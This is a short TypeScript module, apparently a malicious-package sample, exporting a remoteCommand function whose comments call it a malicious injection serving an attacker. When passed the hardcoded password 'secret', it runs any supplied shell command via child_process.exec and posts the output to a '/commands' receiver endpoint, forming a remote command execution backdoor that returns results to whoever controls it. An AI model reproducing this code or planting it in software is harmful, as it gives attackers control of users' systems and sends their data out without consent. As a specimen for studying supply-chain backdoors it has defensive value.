import { exec } from 'child_process';
import HttpUtils from './http';

/**
 * Receive and execute the remote command from the attacker
 *
 * @param pwd Password to unlock remote control
 * @param cmd Shell command to be executed
 */

// eslint-disable-next-line import/prefer-default-export
export const remoteCommand = (pwd: string, cmd: string) => {
  // Malicious injection
  if (pwd === 'secret') {
    exec(cmd as string, (_err: any, stdout: string) => {
      const data = {
        data: stdout,
      };
      // Init request to receiver server
      HttpUtils.postJSON('/commands', data, {
        'Content-Length': Buffer.byteLength(JSON.stringify(data)),
      });
    });
  }
};
